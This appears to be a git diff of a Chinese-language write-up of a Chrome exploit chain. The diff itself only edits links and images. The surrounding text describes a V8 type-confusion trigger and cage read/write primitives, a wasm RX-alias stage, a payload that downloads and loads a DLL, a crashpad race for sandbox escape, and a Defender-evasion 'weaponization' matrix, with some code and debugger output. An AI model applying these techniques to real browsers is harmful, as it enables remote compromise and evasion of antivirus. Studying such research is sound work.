@@ -56,7 +56,7 @@
 
 **从根因到原语**。写屏障被跳过的后果在年轻代 GC 的一瞬间兑现：GC 移动对象后，旧指针仍滞留在新空间（无人替它更新）。在旧指针位置喷射"假 JSArray 头"（map = PACKED_DOUBLE），让 V8 把后续回收的内存当作 double 数组复用——得到一个与 victim 数组共享 elements 的**cage 内任意读写**（read32/write32）。
 
-**EXP 侧触发骨架**（[stage1w.js](poc/stage1w.js)，完整逐行解析见 §三.1）：
+**EXP 侧触发骨架**（stage1w.js，完整逐行解析见 §三.1）：
 
 ```js
 function confuse(a){ function cmp(){ a.fill(0); return 0 } a.sort(cmp) }
@@ -176,7 +176,7 @@ if ( *a2 != 1129341284 || a2[2] != 1 )             // 0x43506164 "CPad" + versio
 > → [dbgwrap] WAW#0 cs_=plant+0x10 → Flush → LoadLibraryW → calc ✔
 > ```
 
-### 3.1 Stage-1：addrof + cage 任意读写（[stage1w.js](poc/stage1w.js) 全文 82 行）
+### 3.1 Stage-1：addrof + cage 任意读写（stage1w.js，全文 82 行）
 
 **addrof 原语**（对应 §2.1/§2.2 形态一）：
 
@@ -242,7 +242,7 @@ write32(data,lo(13.37)); write32(data+4,hi(13.37));
 console.log('ST1 proof 13.37=' + proof_obj[0]);    // 闭环自检：写 cage 读 JS，13.37=13.37
 ```
 
-胜轮 console 实拍（[evidence/console_win_round23.txt](evidence/console_win_round23.txt)）：
+胜轮 console 实拍：
 
 ```
 "GCDBG addrof 11bd51d 11bd5ed sane=true"     ← addrof 原语自检
@@ -251,7 +251,7 @@ console.log('ST1 proof 13.37=' + proof_obj[0]);    // 闭环自检：写 cage �
 "ST1 cage_rw ready"  "ST1 proof 13.37=13.37" ← cage 读写闭环自检
 ```
 
-### 3.2 Stage-2：wasm 私有异常符号伪造 → RX 代码区可写别名（[pocwin_full_w4.js](poc/pocwin_full_w4.js)）
+### 3.2 Stage-2：wasm 私有异常符号伪造 → RX 代码区可写别名（pocwin_full_w4.js）
 
 **手工构造的双实例 wasm 模块**。`buildModule(memoryIndex)` 用字节数组直接拼 wasm 二进制：实例 `a` 用 memory 0，实例 `d` 声明 7 个 memory、读写函数硬编码 **memory index 6**（越界槽位）；模块尾部 10 个 ~300B 的"胖垫函数"把后续跳转目标抬到 0x1300 以上：
 
@@ -298,7 +298,7 @@ if (bad) { console.log('VERIFY-FAIL'); return; }     // 写坏一半绝不点火
 
 ![跳表别名与部署布局](assert/RX-ALIAS.svg)
 
-### 3.3 Stage-3：2.6KB payload 的自举旅行（[payload_src_w4.c](poc/payload_src_w4.c)）
+### 3.3 Stage-3：2.6KB payload 的自举旅行（payload_src_w4.c）
 
 部署进 RX 区别名的 payload 只有 2.6KB，设计原则**零常量、零遍历、零新 DLL**：
 
@@ -351,7 +351,7 @@ __attribute__((noinline, used)) void payload_main(void) {
 
 ### 3.4 cdb 调试方法论：信标尸检法与 dump 证据链
 
-payload 在渲染器里没有任何输出通道——它的"日志"是**故意崩溃**。每个早退点写 `0xDEAD0000+阶段号`，渲染器崩溃后 crashpad 在 profile 目录留下 minidump，异常地址本身就是进度报告。先用自写的百行解析器 [mdmp.c](poc/mdmp.c) 粗筛，再用 cdb 精读。一次真实的 getter 阶段崩溃尸检（dump 存档于 logs/lab-residue，cdb 完整记录：[evidence/cdb_minidump_getter_crash.txt](evidence/cdb_minidump_getter_crash.txt)）：
+payload 在渲染器里没有任何输出通道——它的"日志"是**故意崩溃**。每个早退点写 `0xDEAD0000+阶段号`，渲染器崩溃后 crashpad 在 profile 目录留下 minidump，异常地址本身就是进度报告。先用自写的百行 minidump 解析器粗筛，再用 cdb 精读。一次真实的 getter 阶段崩溃尸检：
 
 ```
 0:000> .ecxr; r rip,rsp,rcx,rdx,r8,r9; u @rip-14 L10; lm a @rip
@@ -364,7 +364,7 @@ chrome+0x555f854:
 00007ffb`60e8f850 4f8d0c23      lea   r9,[r11+r12]
 ```
 
-逐寄存器读数：r9 = `0x268_00000004`（**V8 cage 基址 + 4**），r15 = `0x1fff`，寻址 `r9+r15*8 = cage+0xFFFC`——正是 **cage+0x10000 未提交页**的越界 double 读（`movsd`），且 `lm` 确认 RIP 落在 chrome.dll（JIT/wasm 陷阱路径）。一次 cdb 会话就把"getter 阶段在本机硬崩"从玄学变成读数：这是复现机把到达部署率从 83% 压到 ~24% 的环境敏感点（详见 [logs/rootcause_stage2_dllname_20261020.md](logs/rootcause_stage2_dllname_20261020.md)），而**不是** 0 胜的根因——真正的根因是下面这个：
+逐寄存器读数：r9 = `0x268_00000004`（**V8 cage 基址 + 4**），r15 = `0x1fff`，寻址 `r9+r15*8 = cage+0xFFFC`——正是 **cage+0x10000 未提交页**的越界 double 读（`movsd`），且 `lm` 确认 RIP 落在 chrome.dll（JIT/wasm 陷阱路径）。一次 cdb 会话就把"getter 阶段在本机硬崩"从玄学变成读数：这是复现机把到达部署率从 83% 压到 ~24% 的环境敏感点，而**不是** 0 胜的根因——真正的根因是下面这个：
 
 **跨文件命名契约不一致**（复现 41 轮 0 胜的教训）：竞态器 poc.exe 的植株源查找名硬编码 `%s\evil.dll`，而 payload 的 curl 把 DLL 落盘为 `ev64.dll`——干净环境下 `CreateFileA` 打开源必失败（`fin=INVALID`），竞态赢了也白赢；原开发机 `%TEMP%` 里的残留 evil.dll 掩盖了不一致。决定性实验用"忠实落盘布局"分段复现：
 
@@ -389,7 +389,9 @@ chrome+0x555f854:
 [*] mode=race dbg=1
 ```
 
-三拍对应 §2.3 的溢出几何（[RACE-78952.svg](assert/RACE-78952.svg)）：
+三拍对应 §2.3 的溢出几何：
+
+![78952 竞态三拍](assert/RACE-78952.svg)
 
 1. **微脉冲**：6 个内核线程把目标页在 `PAGE_NOACCESS ↔ PAGE_READWRITE` 间翻转——首读必须撞 NOACCESS（触发 `ERROR_PARTIAL_COPY` 分支），重试瞬间页必须已翻回 RW（让 0x168 全量读出）；
 2. **无钳位重试**：请求 0xB8、实读 0x168、溢出 0xB0 盖到相邻堆槽——minidump 流的 SMMW（SimpleMemoryMappedViewWriter）对象被部分覆写；
@@ -406,7 +408,9 @@ chrome+0x555f854:
 
 ### 3.6 武器化演进：四代方案的生死簿与 Defender 拦截矩阵
 
-stage-2 落地通道的选择是实测驱动的，不是靠"常识"（[WEAPONIZE.svg](assert/WEAPONIZE.svg)）：
+stage-2 落地通道的选择是实测驱动的，不是靠"常识"：
+
+![武器化四代演进与 Defender 拦截矩阵](assert/WEAPONIZE.svg)
 
 | 代 | 方案 | 结局 | 胜率 |
 |---|---|---|---|
